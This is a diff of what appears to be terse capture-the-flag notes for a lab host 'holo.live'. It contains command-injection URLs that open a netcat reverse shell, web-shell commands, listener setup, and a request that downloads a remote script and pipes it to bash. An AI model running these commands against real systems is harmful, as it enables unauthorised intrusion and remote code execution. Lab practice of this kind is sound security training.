@@ -5,17 +5,23 @@ Log in with the credentials `admin:DBManagerLogin!`
 
 http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.107.22+4444
 
-`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+
 
 www-data@f988aa7b2fb3:/var/www/html$ `curl 192.168.100.1:8080/shell.php?cmd=whoami`
 
 www-data@69cd1465ecc9:/var/www/admin$ `curl 192.168.100.1:8080/shell.php?cmd=hostname`
 
-`python3 -m http.server 80`
 
 `nc -lvnp 53`
 
+```
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'
+```
 
 `python3 -m http.server 80`
 
